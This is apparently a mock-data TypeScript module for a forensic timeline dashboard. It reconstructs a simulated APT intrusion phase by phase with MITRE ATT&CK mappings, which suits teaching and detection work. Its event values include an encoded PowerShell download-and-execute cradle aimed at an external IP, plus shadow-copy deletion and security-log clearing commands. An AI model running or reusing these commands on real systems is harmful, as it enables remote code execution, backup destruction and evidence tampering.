import type { EventType } from '../types/event';

// ─────────────────────────────────────────────────────────────────────────────
// PWNDORA  ·  Forensic Event Data Layer
// ─────────────────────────────────────────────────────────────────────────────
// Case:       IR-2026-0719-APEX
// Analyst:    Incident Response – Tier III
// Subject:    APT intrusion targeting Nexagen Dynamics Corp. finance division
// Window:     2026-07-25T08:12Z → 2026-07-25T12:08Z  (≈ 4 h)
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Immutable record representing a single forensic artefact observation
 * extracted during DFIR triage.
 *
 * Each entry correlates a host-level artefact (MFT record, Prefetch file,
 * Registry key, Event Log entry, or network flow) to a specific phase of
 * the MITRE ATT&CK kill-chain, enabling chronological incident
 * reconstruction within the PWNDORA timeline view.
 *
 * All properties are `readonly` to enforce referential transparency
 * across dashboard components that consume this data.
 */
export interface ForensicEvent {
  /** UUIDv4 identifier for cross-referencing within the case graph. */
  readonly id: string;
  /** ISO 8601 timestamp with UTC offset. */
  readonly timestamp: string;
  /** Source artefact class (e.g. Prefetch, EVTX, MFT, Registry, PCAP). */
  readonly artifactType: string;
  /** Specific field or attribute extracted from the artefact. */
  readonly extractedField: string;
  /** The raw or decoded value of the extracted field. */
  readonly value: string;
  /** Analyst-authored narrative explaining forensic relevance. */
  readonly significance: string;
  /** MITRE ATT&CK technique identifier (e.g. T1059.001). */
  readonly mitreId: string;
  /** Severity classification consumed by the PWNDORA visual pipeline. */
  readonly type: EventType;
}

// ─────────────────────────────────────────────────────────────────────────────
// PHASE 1 — Initial Access  (T1566.001 → T1204.002)
// Spear-phishing attachment containing weaponised LNK
// ─────────────────────────────────────────────────────────────────────────────
// PHASE 2 — Execution  (T1059.001)
// De-obfuscated PowerShell downloads Cobalt Strike beacon
// ─────────────────────────────────────────────────────────────────────────────
// PHASE 3 — Persistence  (T1547.001 → T1053.005)
// Registry Run key + scheduled task ensure beacon survives reboot
// ─────────────────────────────────────────────────────────────────────────────
// PHASE 4 — Defense Evasion  (T1070.004 → T1070.001)
// Shadow copy deletion (VSS) + Security log clearing
// ─────────────────────────────────────────────────────────────────────────────
// PHASE 5 — Lateral Movement & Exfiltration  (T1021.001 → T1041)
// RDP pivot → archive sensitive dirs → exfil over HTTPS
// ─────────────────────────────────────────────────────────────────────────────

const forensicEvents: ReadonlyArray<ForensicEvent> = [

  // ═══════════════════════════════════════════════════════════════════════════
  // PHASE 1 ─ INITIAL ACCESS
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: 'c7a1e0b3-44d2-4f8a-b6e1-9d3c5f7a2b14',
    timestamp: '2026-07-25T08:12:04.000Z',
    artifactType: 'SMTP Gateway Log',
    extractedField: 'Attachment Filename',
    value: 'Q3_Financial_Audit_Draft.pdf.lnk',
    significance:
      'Spear-phishing email delivered to v.patel@nexagen-dynamics.com with double-extension LNK payload masquerading as PDF. Sender spoofed as cfo@nexagen-dynamics.com via header manipulation. SPF soft-fail was not enforced.',
    mitreId: 'T1566.001',
    type: 'critical',
  },

  {
    id: '3f8d9a21-7b5e-4c1d-a94f-e6b0d82c1a37',
    timestamp: '2026-07-25T08:14:31.000Z',
    artifactType: 'LNK (Shortcut)',
    extractedField: 'Target Path',
    value: 'C:\\Users\\VPatel\\AppData\\Local\\Temp\\Q3_Financial_Audit_Draft.pdf.lnk',
    significance:
      'User V. Patel (Finance Director) executed the malicious LNK from Outlook temp cache. $MFT $SI timestamps show $CREATED = $MODIFIED within 200ms — no prior existence on disk, confirming download-and-open behaviour.',
    mitreId: 'T1204.002',
    type: 'critical',
  },

  {
    id: 'a54b1c6e-89f3-42d7-b0e5-1c7d4f9a3e28',
    timestamp: '2026-07-25T08:14:33.000Z',
    artifactType: 'MFT ($LogFile)',
    extractedField: '$STANDARD_INFORMATION vs $FILE_NAME Timestamp Delta',
    value: '$SI Created: 2026-07-25T08:14:31.412Z | $FN Created: 2026-07-25T08:14:31.208Z | Δ = +204ms',
    significance:
      'Negligible delta between $SI and $FN creation timestamps rules out timestomping. Artefact is consistent with a genuine first-write from Outlook attachment handler (OLMAPI32.DLL) — the LNK was never pre-staged.',
    mitreId: 'T1204.002',
    type: 'info',
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // PHASE 2 ─ EXECUTION
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: 'e92f7d15-3a4b-4e6c-8d1f-b5c0a7e29d46',
    timestamp: '2026-07-25T08:14:47.000Z',
    artifactType: 'Windows Event Log (Sysmon)',
    extractedField: 'Process Create (Event ID 1)',
    value: 'powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMQA4ADUALgAyADEAMgAuADQANwAuADMAOQAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==',
    significance:
      'LNK target invoked powershell.exe with -NoProfile -WindowStyle Hidden and a Base64-encoded IEX cradle. Decoded payload: IEX(New-Object Net.WebClient).DownloadString(\'https://185.212.47.39/update.ps1\') — classic staged Cobalt Strike loader.',
    mitreId: 'T1059.001',
    type: 'critical',
  },

  {
    id: '6b3e8f94-d1c2-47a5-9e0b-a4f6c8d73b59',
    timestamp: '2026-07-25T08:15:02.000Z',
    artifactType: 'Prefetch (.pf)',
    extractedField: 'Executable / Run Count',
    value: 'POWERSHELL.EXE-7A3C1F9E.pf | Run Count: 1 | Last Run: 2026-07-25T08:14:47Z',
    significance:
      'Prefetch run count of 1 confirms this is the first-ever PowerShell execution under VPatel\'s profile on this workstation (WKST-FIN-042). Correlates exactly with Sysmon Event ID 1 process creation timestamp.',
    mitreId: 'T1059.001',
    type: 'warning',
  },

  {
    id: '1d4a5b7c-e8f9-4023-b6d1-c9a3e5f70b82',
    timestamp: '2026-07-25T08:15:38.000Z',
    artifactType: 'PCAP / NetFlow',
    extractedField: 'HTTPS Beacon Callback',
    value: 'dst=185.212.47.39:443 | SNI=cdn-assets-update.com | JA3=a0e9f5d64349fb13191bc781f81f42e1 | bytes_out=1,247 | bytes_in=287,614',
    significance:
      'Outbound TLS session to C2 IP with JA3 hash matching known Cobalt Strike 4.9 malleable-C2 profile. 287 KB inbound payload consistent with reflective DLL beacon (x64, staged). Certificate CN=cdn-assets-update.com registered 72 h prior via Namecheap.',
    mitreId: 'T1071.001',
    type: 'critical',
  },

  {
    id: '8c2d1e6f-b3a4-4957-a0f8-d5e7c9b14a63',
    timestamp: '2026-07-25T08:16:11.000Z',
    artifactType: 'Prefetch (.pf)',
    extractedField: 'Executable / Run Count',
    value: 'RUNDLL32.EXE-3F2C8A71.pf | Run Count: 1 | Last Run: 2026-07-25T08:16:09Z',
    significance:
      'Prefetch confirms rundll32.exe loaded a reflective DLL payload immediately after beacon download. Referenced file path in Prefetch directory listing: C:\\Users\\VPatel\\AppData\\Local\\Temp\\~DF4A2B.tmp — indicative of in-memory injection via CreateRemoteThread.',
    mitreId: 'T1055.001',
    type: 'critical',
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // PHASE 3 ─ PERSISTENCE
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: 'f5a9c3d7-2e1b-4684-87f0-b6d8e1c45a29',
    timestamp: '2026-07-25T08:23:44.000Z',
    artifactType: 'Registry (NTUSER.DAT)',
    extractedField: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
    value: '"OneDriveSyncHelper" = "C:\\Users\\VPatel\\AppData\\Roaming\\Microsoft\\OneDrive\\SyncHelper.exe"',
    significance:
      'New Run key value "OneDriveSyncHelper" planted under HKCU. Binary SyncHelper.exe (SHA-256: 4a3b8f2c1d6e9a7b5c0d3e8f1a4b7c2d5e9f0a3b6c8d1e4f7a0b3c6d9e2f5a8b) is a renamed Cobalt Strike beacon — name chosen to blend with legitimate OneDrive processes.',
    mitreId: 'T1547.001',
    type: 'alert',
  },

  {
    id: 'd7b4e1f8-6c3a-4529-9d0e-a8f2c5b17d34',
    timestamp: '2026-07-25T08:26:19.000Z',
    artifactType: 'Windows Event Log (Task Scheduler)',
    extractedField: 'Event ID 106 – Task Registered',
    value: 'Task: \\Microsoft\\Windows\\NetTrace\\PerfDiagLogger | Action: C:\\Windows\\Temp\\perfmon_helper.bat | Trigger: DAILY 08:00 + AtLogon',
    significance:
      'Scheduled task disguised under legitimate NetTrace path. The .bat file invokes SyncHelper.exe with -s flag (sleep/persistence mode). Dual triggers (daily + logon) provide redundant persistence — if the Run key is remediated, the task re-establishes it.',
    mitreId: 'T1053.005',
    type: 'alert',
  },

  {
    id: '2e5f8a1b-c4d7-4903-b6e9-f0a3d8c71e45',
    timestamp: '2026-07-25T08:27:03.000Z',
    artifactType: 'MFT ($LogFile)',
    extractedField: 'File Creation in Windows\\Temp',
    value: 'C:\\Windows\\Temp\\perfmon_helper.bat | Size: 418 bytes | SHA-256: 9e1f2a3b4c5d6e7f8a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f',
    significance:
      'Batch dropper writes single-line invocation: start /b "" "C:\\Users\\VPatel\\AppData\\Roaming\\Microsoft\\OneDrive\\SyncHelper.exe" -s. File timestamp $SI and $FN are identical, no timestomping detected.',
    mitreId: 'T1053.005',
    type: 'warning',
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // PHASE 4 ─ DEFENSE EVASION
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: 'b8c3d2e1-a7f6-4015-9b4e-d0c9a5f83b67',
    timestamp: '2026-07-25T09:41:07.000Z',
    artifactType: 'Windows Event Log (System)',
    extractedField: 'Event ID 104 – Log Cleared / VSS Deletion',
    value: 'vssadmin.exe delete shadows /all /quiet | Process PID: 7284 | Parent: cmd.exe (PID 6192)',
    significance:
      'All Volume Shadow Copies destroyed via vssadmin. Executed from cmd.exe spawned by SyncHelper.exe beacon — eliminates ability to recover prior NTFS snapshots, deleted files, or previous Registry states. Classic pre-ransomware / anti-forensics TTP.',
    mitreId: 'T1070.004',
    type: 'critical',
  },

  {
    id: '91a4b5c6-d7e8-4f29-a0b1-c2d3e4f5a6b7',
    timestamp: '2026-07-25T09:41:22.000Z',
    artifactType: 'Prefetch (.pf)',
    extractedField: 'Executable / Run Count',
    value: 'VSSADMIN.EXE-6B2E4C8F.pf | Run Count: 1 | Last Run: 2026-07-25T09:41:07Z',
    significance:
      'Prefetch independently corroborates vssadmin.exe execution at the exact System Event Log timestamp. Run count of 1 indicates this binary had never been invoked on WKST-FIN-042 prior to compromise — strongly anomalous for a finance workstation.',
    mitreId: 'T1070.004',
    type: 'warning',
  },

  {
    id: 'c4d5e6f7-a8b9-4c01-d2e3-f4a5b6c7d8e9',
    timestamp: '2026-07-25T09:44:58.000Z',
    artifactType: 'Windows Event Log (Security)',
    extractedField: 'Event ID 1102 – Audit Log Cleared',
    value: 'Subject: NEXAGEN\\VPatel | Logon ID: 0x3E7 | Process: wevtutil.exe cl Security',
    significance:
      'Security event log wiped via wevtutil.exe under the VPatel session context. This destroys authentication records (4624/4625), privilege escalation traces (4672), and object access auditing. The 1102 entry itself is the only surviving indicator because Windows generates it after the clear operation.',
    mitreId: 'T1070.001',
    type: 'critical',
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // PHASE 5 ─ LATERAL MOVEMENT & EXFILTRATION
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: 'a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d',
    timestamp: '2026-07-25T10:18:36.000Z',
    artifactType: 'Windows Event Log (Security)',
    extractedField: 'Event ID 4624 – Logon Type 10 (RemoteInteractive)',
    value: 'Source: WKST-FIN-042 (10.10.24.118) → Target: FILESRV-01 (10.10.24.5) | Account: NEXAGEN\\svc_backup | Logon GUID: {7a2b3c4d-5e6f-4a8b-9c0d-1e2f3a4b5c6d}',
    significance:
      'RDP lateral movement from compromised workstation to file server using harvested svc_backup credentials. Type 10 logon indicates interactive Remote Desktop — attacker now has GUI access to the central file share hosting /Finance/Quarterly_Reports/ and /Legal/M&A_Drafts/.',
    mitreId: 'T1021.001',
    type: 'critical',
  },

  {
    id: 'd6e7f8a9-b0c1-4d2e-3f4a-5b6c7d8e9f01',
    timestamp: '2026-07-25T10:19:04.000Z',
    artifactType: 'Prefetch (.pf)',
    extractedField: 'Executable / Run Count (Remote Host)',
    value: 'QUSER.EXE-1A2B3C4D.pf | Run Count: 1 | NLTEST.EXE-5E6F7A8B.pf | Run Count: 1',
    significance:
      'On FILESRV-01: quser.exe enumerated active RDP sessions; nltest.exe performed domain trust enumeration (/domain_trusts /all_trusts). Both are first-time executions per Prefetch, consistent with attacker reconnaissance immediately after lateral pivot.',
    mitreId: 'T1018',
    type: 'warning',
  },

  {
    id: 'e8f9a0b1-c2d3-4e5f-6a7b-8c9d0e1f2a3b',
    timestamp: '2026-07-25T11:02:17.000Z',
    artifactType: 'Prefetch (.pf)',
    extractedField: 'Executable / Run Count (Remote Host)',
    value: '7Z.EXE-9C0D1E2F.pf | Run Count: 3 | Last Run: 2026-07-25T11:02:14Z | Referenced dirs: D:\\Shares\\Finance\\*, D:\\Shares\\Legal\\M&A_Drafts\\*',
    significance:
      '7-Zip executed three times on FILESRV-01, systematically archiving Finance and Legal/M&A directories. Prefetch directory references confirm access to highly sensitive pre-merger documentation. Output archive estimated at ~1.4 GB based on Prefetch volume trace metadata.',
    mitreId: 'T1560.001',
    type: 'alert',
  },

  {
    id: 'f0a1b2c3-d4e5-4f6a-7b8c-9d0e1f2a3b4c',
    timestamp: '2026-07-25T11:47:33.000Z',
    artifactType: 'PCAP / NetFlow',
    extractedField: 'Anomalous Outbound HTTPS Volume',
    value: 'src=10.10.24.5:49821 → dst=104.21.73.198:443 | SNI=storage-sync-cdn.com | Duration: 47m12s | Bytes Out: 1,438,917,632 (1.34 GB) | JA3=a0e9f5d64349fb13191bc781f81f42e1',
    significance:
      'Sustained 47-minute HTTPS exfiltration session from FILESRV-01 to external IP. TLS JA3 fingerprint matches the same Cobalt Strike malleable-C2 profile observed in Phase 2. Transfer volume (~1.34 GB) aligns with estimated 7z archive size. Destination domain registered 48 h prior via Njalla privacy registrar.',
    mitreId: 'T1041',
    type: 'critical',
  },

  {
    id: 'a3b4c5d6-e7f8-4a9b-0c1d-2e3f4a5b6c7d',
    timestamp: '2026-07-25T12:08:41.000Z',
    artifactType: 'Windows Event Log (Security)',
    extractedField: 'Event ID 4634 – Logoff',
    value: 'Account: NEXAGEN\\svc_backup | Logon Type: 10 | Workstation: FILESRV-01 | Logon ID: 0x4F3A2B1C | Session Duration: 01:50:05',
    significance:
      'Attacker cleanly terminated RDP session on FILESRV-01 after confirming exfiltration completion. 110-minute session duration covers the full lateral-movement → staging → exfiltration chain. No further beacon callbacks observed after this logoff — indicating the operator completed their objective and retracted.',
    mitreId: 'T1021.001',
    type: 'info',
  },

] as const;

export default forensicEvents;

/**
 * Named re-export for consumers that prefer explicit destructured imports.
 *
 * @example
 * ```ts
 * import { mockForensicData } from '../data/mockData';
 * import type { ForensicEvent } from '../data/mockData';
 * ```
 */
export { forensicEvents as mockForensicData };